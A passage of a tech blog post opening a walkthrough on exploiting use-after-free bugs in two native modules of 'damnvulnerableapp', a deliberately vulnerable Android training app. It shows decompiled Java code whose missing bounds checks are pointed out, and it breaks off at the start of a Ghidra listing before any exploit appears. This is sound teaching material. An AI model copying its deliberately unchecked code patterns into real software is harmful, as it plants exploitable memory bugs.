<!doctype html><html lang=en dir=ltr><head><title>E²VA: Use After Free Write/Execute Module (Part 4) :: lolcads tech blog</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Exploitation of Use - After - Free Modules In this post we will be discussing how to exploit a Use - After - Free bug in both UseAfterFreeExecModule and UseAfterFreeWriteModule. As the names of the modules suggest, they differ in terms of the impact the bug has. To that end, in UseAfterFreeExecModule we will be able to control a function pointer, whereas in UseAfterFreeWriteModule we are given a Write - What - Where condition."><meta name=keywords content="Android,Binary Exploitation,JNI,E²VA,Use After Free,Memory Leak"><meta name=robots content="noodp"><link rel=manifest href=/manifest.json><meta property="og:url" content="https://lolcads.github.io/posts/2024/07/eva_3/"><meta property="og:site_name" content="lolcads tech blog"><meta property="og:title" content="E²VA: Use After Free Write/Execute Module (Part 4)"><meta property="og:description" content="Exploitation of Use - After - Free Modules In this post we will be discussing how to exploit a Use - After - Free bug in both UseAfterFreeExecModule and UseAfterFreeWriteModule. As the names of the modules suggest, they differ in terms of the impact the bug has. To that end, in UseAfterFreeExecModule we will be able to control a function pointer, whereas in UseAfterFreeWriteModule we are given a Write - What - Where condition."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-07-24T16:46:21+01:00"><meta property="article:modified_time" content="2024-07-24T16:46:21+01:00"><meta property="article:tag" content="Android"><meta property="article:tag" content="Binary Exploitation"><meta property="article:tag" content="JNI"><meta property="article:tag" content="E²VA"><meta property="article:tag" content="Use After Free"><meta property="article:tag" content="Memory Leak"><meta name=twitter:card content="summary"><meta name=twitter:title content="E²VA: Use After Free Write/Execute Module (Part 4)"><meta name=twitter:description content="Exploitation of Use - After - Free Modules In this post we will be discussing how to exploit a Use - After - Free bug in both UseAfterFreeExecModule and UseAfterFreeWriteModule. As the names of the modules suggest, they differ in terms of the impact the bug has. To that end, in UseAfterFreeExecModule we will be able to control a function pointer, whereas in UseAfterFreeWriteModule we are given a Write - What - Where condition."><link rel=canonical href=https://lolcads.github.io/posts/2024/07/eva_3/><link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=/css/index.min.c860e17f20d9f258820c02bf7ab3f57c9595d0bc21dede7eda08ccd63ba3f4cc.css></head><body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800"><header class="flex flex-none justify-center z-10"><div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3"><div class="flex-none ml-2 md:ml-0"><a href=/><img class="h-12 w-12 rounded-full object-cover bg-gray-100" src=/logo.png alt=logo></a></div><div class=flex-1></div><div class=flex-none><nav class="h-full static"><button id=navbar-menu-toggle type=button class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls=navbar-menu aria-expanded=false>
<span class=sr-only>Open main menu</span>
<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 6h16"/><path d="M4 12h16"/><path d="M4 18h16"/></svg></i></button><div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id=navbar-menu><ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5"><li id=post><a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600" href=/posts/ title=Blog>Blog</a></li><li id=about><a class="block px-3 py-3 hover:text-emerald-600" href=/about/ title=About>About</a></li><li id=contact><a class="block px-3 py-3 hover:text-emerald-600" href=/contact/ title=Contact>Contact</a></li></ul></div></nav></div><div class="flex-none mx-1"></div><div class="flex-none md:hidden"><a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls=navbar-menu aria-expanded=false><span class=sr-only>Search</span>
<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1014 0A7 7 0 103 10"/><path d="M21 21l-6-6"/></svg></i></a></div><div class="darkmode-toggle flex flex-none mr-2 md:mr-0"><label for=darkmode-toggle class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode"><input name=darkmode-toggle id=darkmode-toggle type=checkbox class="sr-only peer" aria-label="Toggle dark mode"><div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700"><i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible"><svg class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-3 0a3 3 0 106 0 3 3 0 10-6 0"/><path d="M12 5v.01"/><path d="M17 7v.01"/><path d="M19 12v.01"/><path d="M17 17v.01"/><path d="M12 19v.01"/><path d="M7 17v.01"/><path d="M5 12v.01"/><path d="M7 7v.01"/></svg>
</i><i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible"><svg class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 3c.132.0.263.0.393.0a7.5 7.5.0 007.92 12.446A9 9 0 1112 2.992z"/><path d="M17 4a2 2 0 002 2 2 2 0 00-2 2 2 2 0 00-2-2 2 2 0 002-2"/><path d="M19 11h2m-1-1v2"/></svg></i></div></label></div></div></header><main class="flex flex-auto justify-center"><div class="w-full max-w-4xl lg:max-w-5xl"><div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700"><div><a href=/posts/2024/07/eva_3/></a></div><div class="flex flex-col gap-y-3 p-6"><h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100"><a href=/posts/2024/07/eva_3/>E²VA: Use After Free Write/Execute Module (Part 4)</a></h1><ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300"><li><a href=/tags/android/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Android</span></a></li><li><a href=/tags/binary-exploitation/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Binary Exploitation</span></a></li><li><a href=/tags/jni/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>JNI</span></a></li><li><a href=/tags/eva/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>E²VA</span></a></li><li><a href=/tags/use-after-free/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Use After Free</span></a></li><li><a href=/tags/memory-leak/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Memory Leak</span></a></li></ul><div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300"><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 7a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V7z"/><path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/><path d="M11 15h1"/><path d="M12 15v3"/></svg>
</i><time datetime=2024-07-24T16:46:21+01:00>2024-07-24</time></div><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6.5 7h11"/><path d="M6 20v-2a6 6 0 1112 0v2a1 1 0 01-1 1H7a1 1 0 01-1-1z"/><path d="M6 4v2a6 6 0 1012 0V4a1 1 0 00-1-1H7A1 1 0 006 4z"/></svg>
</i><span>32 minutes to read</span></div></div><div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300"><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-user"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 7a4 4 0 108 0A4 4 0 008 7"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
</i><span>Pascal Kühnemann</span></div></div><section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6"><h2>Table of Contents</h2><aside><nav id=TableOfContents><ul><li><a href=#about-this-post>About this post</a></li><li><a href=#assumptions>Assumptions</a></li><li><a href=#analysis-baseline>Analysis baseline</a></li><li><a href=#trying-to-get-code-execution-in-useafterfreewritemodule>Trying to get code execution in <em>UseAfterFreeWriteModule</em></a><ul><li><a href=#leaking-data>Leaking data</a></li><li><a href=#the-bug>The bug</a></li><li><a href=#trying-to-exploit>Trying to exploit</a></li></ul></li><li><a href=#exploitation-of-useafterfreeexecmodule>Exploitation of <em>UseAfterFreeExecModule</em></a><ul><li><a href=#finding-a-better-obj--0x100>Finding a better <em>obj + 0x100</em></a></li><li><a href=#trying-to-earn-all-the-fruits>Trying to earn all the fruits</a></li><li><a href=#finally-the-solution>Finally: the solution</a></li></ul></li><li><a href=#coming-back-from-useafterfreeexecmodule>Coming back from <em>UseAfterFreeExecModule</em></a></li><li><a href=#summary>Summary</a></li></ul></nav></aside></section><article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content"><h1 id=exploitation-of-use---after---free-modules>Exploitation of <em>Use - After - Free</em> Modules</h1><p>In this post we will be discussing how to exploit a <em>Use - After - Free</em> bug in both <em>UseAfterFreeExecModule</em> and <em>UseAfterFreeWriteModule</em>. As the names of the modules suggest, they differ in terms of the impact the bug has. To that end, in <em>UseAfterFreeExecModule</em> we will be able to control a function pointer, whereas in <em>UseAfterFreeWriteModule</em> we are given a <em>Write - What - Where</em> condition.</p><h2 id=about-this-post>About this post</h2><p>Before we jump into details I want to make a few things clear about this post. The initial part of this post will be about <strong>failing</strong> to exploit the <em>Use - After - Free</em> bug that enables a <em>Write - What - Where</em> condition. Thus the initial part will contain a lot of incomplete approaches of getting code execution. This is also why this post covers two modules at the same time, because initially there only was the <em>UseAfterFreeWriteModule</em>, but it was too hard to start with, so I introduced <em>UseAfterFreeExecModule</em> and derived a technique that is applicable to both modules.</p><p>If you are not interested in reading about one of the core pillars of binary exploitation, i.e. <strong>failure</strong>, then feel free to skip to the <a href=#coming-back-from-useafterfreeexecmodule>fun part</a>
:)</p><h2 id=assumptions>Assumptions</h2><p>We will assume that we have successfully grabbed a copy of the <code>.apk</code> file of <em>damnvulnerableapp</em>. Also, we will <strong>not</strong> discuss how to unpack an <code>.apk</code> file, but rather assume that we have access to <code>libUseAfterFree(Exec/Write)Module.so</code> and the <code>UseAfterFree(Exec/Write)Module</code> class. If it is unclear how to get access to these components when only given an <code>.apk</code> file, read the previous blog posts first!</p><h2 id=analysis-baseline>Analysis baseline</h2><p>As we have access to the <code>.apk</code> file, we can utilize <a href=https://github.com/skylot/jadx target=_blank rel=noopener><em>jadx</em></a>
to get the source code of <code>UseAfterFreeExecModule</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=cm>/* loaded from: classes10.dex */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>UseAfterFreeExecModule</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>VulnerableModule</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>native</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>lookupExamples</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>native</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>storePair</span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bArr</span><span class=p>,</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=n>j</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>static</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>loadLibrary</span><span class=p>(</span><span class=s>&#34;UseAfterFreeExecModule&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>UseAfterFreeExecModule</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>super</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>UseAfterFreeExecModuleConfiguration</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w> </span><span class=c1>// com.damnvulnerableapp.vulnerable.modules.VulnerableModule</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>()</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>VulnerableModuleException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>output</span><span class=p>(</span><span class=s>&#34;Key - Value Storage! Most secure in this field!&#34;</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=kc>true</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>output</span><span class=p>(</span><span class=s>&#34;Send a number between 1 and 4 (0 to continue) to see one of four key name templates:&#34;</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>int</span><span class=w> </span><span class=n>index</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ByteBuffer</span><span class=p>.</span><span class=na>wrap</span><span class=p>(</span><span class=n>input</span><span class=p>()).</span><span class=na>getInt</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>index</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>break</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>output</span><span class=p>(</span><span class=n>lookupExamples</span><span class=p>(</span><span class=n>index</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>1</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=kc>true</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>output</span><span class=p>(</span><span class=s>&#34;Please provide the key name (EXIT to end app): &#34;</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>input</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=p>(</span><span class=n>name</span><span class=p>).</span><span class=na>toUpperCase</span><span class=p>(</span><span class=n>Locale</span><span class=p>.</span><span class=na>ROOT</span><span class=p>).</span><span class=na>equals</span><span class=p>(</span><span class=s>&#34;EXIT&#34;</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>output</span><span class=p>(</span><span class=s>&#34;Terminating...&#34;</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>output</span><span class=p>(</span><span class=s>&#34;Please provide the key value: &#34;</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>long</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ByteBuffer</span><span class=p>.</span><span class=na>wrap</span><span class=p>(</span><span class=n>input</span><span class=p>()).</span><span class=na>getLong</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>storePair</span><span class=p>(</span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>output</span><span class=p>(</span><span class=n>result</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>and <code>UseAfterFreeWriteModule</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=cm>/* loaded from: classes10.dex */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>UseAfterFreeWriteModule</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>VulnerableModule</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>private</span><span class=w> </span><span class=kd>native</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>lookupExamples</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>private</span><span class=w> </span><span class=kd>native</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>storePair</span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bArr</span><span class=p>,</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=n>j</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>static</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>System</span><span class=p>.</span><span class=na>loadLibrary</span><span class=p>(</span><span class=s>&#34;UseAfterFreeWriteModule&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=nf>UseAfterFreeWriteModule</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=kd>super</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>UseAfterFreeWriteModuleConfiguration</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=nd>@Override</span><span class=w> </span><span class=c1>// com.damnvulnerableapp.vulnerable.modules.VulnerableModule</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>()</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>VulnerableModuleException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>output</span><span class=p>(</span><span class=s>&#34;Key - Value Storage! Most secure in this field!&#34;</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=kc>true</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>output</span><span class=p>(</span><span class=s>&#34;Send a number between 1 and 4 (0 to continue) to see one of four key name templates:&#34;</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=kt>int</span><span class=w> </span><span class=n>index</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ByteBuffer</span><span class=p>.</span><span class=na>wrap</span><span class=p>(</span><span class=n>input</span><span class=p>()).</span><span class=na>getInt</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>index</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=k>break</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>output</span><span class=p>(</span><span class=n>lookupExamples</span><span class=p>(</span><span class=n>index</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>1</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=kc>true</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>output</span><span class=p>(</span><span class=s>&#34;Please provide the key name (EXIT to end app): &#34;</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>input</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=p>(</span><span class=n>name</span><span class=p>).</span><span class=na>toUpperCase</span><span class=p>(</span><span class=n>Locale</span><span class=p>.</span><span class=na>ROOT</span><span class=p>).</span><span class=na>equals</span><span class=p>(</span><span class=s>&#34;EXIT&#34;</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=n>output</span><span class=p>(</span><span class=s>&#34;Terminating...&#34;</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>output</span><span class=p>(</span><span class=s>&#34;Please provide the key value: &#34;</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=kt>long</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ByteBuffer</span><span class=p>.</span><span class=na>wrap</span><span class=p>(</span><span class=n>input</span><span class=p>()).</span><span class=na>getLong</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>storePair</span><span class=p>(</span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>output</span><span class=p>((</span><span class=s>&#34;Successfully stored (&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=p>(</span><span class=n>name</span><span class=p>)</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;:&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;)!&#34;</span><span class=p>).</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>In both cases, we can see that:</p><ol><li>An arbitrary amount of integers can be passed to <code>lookupExamples</code>. There seem to be <strong>no bounds checks</strong>!</li><li>An arbitrary amount of <em>key - value</em> pairs can be stored using <code>storePair</code>. Notice that the <em>value</em> is an 8 - byte integer.</li></ol><p>Now, for the shared - object files we can use <a href=https://ghidra-sre.org/ target=_blank rel=noopener><em>Ghidra</em></a>
. Starting with <code>libUseAfterFreeExecModule.so</code> yields the (already beautified) code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>jbyteArray</span>
